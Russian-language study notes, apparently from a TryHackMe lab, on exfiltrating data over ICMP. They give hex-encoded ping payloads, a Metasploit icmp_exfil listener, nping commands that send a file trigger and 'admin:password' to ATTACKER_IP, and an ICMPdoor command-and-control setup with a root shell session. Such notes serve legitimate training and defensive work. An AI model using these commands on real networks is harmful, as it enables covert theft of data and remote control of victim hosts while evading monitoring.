# ICMP DATA EXFILTRATION

## Что такое ICMP

ICMP (Internet Control Message Protocol) — протокол сетевого уровня, используемый для диагностики сети (ping, traceroute). Работает поверх IP, не является транспортным протоколом (не используется для передачи данных).

**Ключевая особенность:** ICMP-пакеты имеют **Data Section**, куда можно вставить произвольные данные. Это поле обычно используется для диагностики, но может быть использовано для скрытой передачи данных.


## Как выглядит ICMP-пакет

```
┌─────────────────────────────────────────────┐
│         IP Header                           │
├─────────────────────────────────────────────┤
│         ICMP Header                         │
│  Type (8=request, 0=reply)                  │
│  Code                                       │
│  Checksum                                   │
├─────────────────────────────────────────────┤
│         DATA SECTION                        │ ← можно заполнить
│  (произвольные данные)                      │
└─────────────────────────────────────────────┘
```


## 1. РУЧНАЯ ПЕРЕДАЧА ДАННЫХ ЧЕРЕЗ ICMP

### Конвертация текста в HEX

```bash
echo "thm:tryhackme" | xxd -p
```

Вывод: `74686d3a7472796861636b6d650a`

### Отправка ICMP-пакета с данными

```bash
ping TARGET_IP -c 1 -p 74686d3a7472796861636b6d650a
```

**Параметры:**
- `-c 1` — 1 пакет
- `-p` — данные в hex (только Linux)


## 2. ICMP EXFILTRATION ЧЕРЕЗ METASPLOIT

### Схема работы

1. Атакующий запускает `icmp_exfil` модуль в Metasploit.
2. Жертва отправляет **триггер** `^BOFfilename.txt`.
3. Жертва отправляет **данные** (несколько ICMP-пакетов).
4. Жертва отправляет **конец файла** `EOF`.
5. Metasploit сохраняет полученные данные в `/root/.msf4/loot/`.

### Настройка Metasploit

```bash
msfconsole
use auxiliary/server/icmp_exfil
set BPF_FILTER icmp and not src ATTACKBOX_IP
set INTERFACE eth0
run
```

### Отправка данных с жертвы (через nping)

```bash
# 1. Отправить триггер
sudo nping --icmp -c 1 ATTACKER_IP --data-string "BOFfile.txt"

# 2. Отправить данные
sudo nping --icmp -c 1 ATTACKER_IP --data-string "admin:password"

# 3. Отправить конец файла
sudo nping --icmp -c 1 ATTACKER_IP --data-string "EOF"
```

### Результат

```
[+] Beginning capture of "file.txt" data
[+] End of File received. Saving "file.txt" to loot
[+] Loot filename: /root/.msf4/loot/...txt
```

## 3. ICMP C2 COMMUNICATION (ICMPDOOR)

### Что это

Инструмент для выполнения команд через ICMP-туннель. Атакующий отправляет команду в ICMP-пакете, жертва выполняет и отправляет результат обратно.

### Установка на жертве

```bash
sudo icmpdoor -i eth0 -d ATTACKER_IP
```

### Установка на атакующем

```bash
sudo icmp-cnc -i eth1 -d VICTIM_IP
```

### Пример работы

```bash
shell: hostname
icmp-host
shell: whoami
root
shell: id
uid=0(root) gid=0(root)
```

## 4. ПРЕИМУЩЕСТВА И ОГРАНИЧЕНИЯ

| Преимущества | Ограничения |
|--------------|-------------|
| Трудно обнаружить | Медленная передача (маленький payload) |
| Часто не блокируется файрволами | Требуется ручная настройка |
| Не логируется как HTTP/DNS | ICMP может быть ограничен в корпоративных сетях |



## 📌 Ключевой вывод

ICMP — это не просто диагностический протокол, а канал для скрытой передачи данных. Его редко блокируют, и трафик выглядит как обычный ping. Это делает ICMP мощным инструментом для exfiltration и C2. 🚀
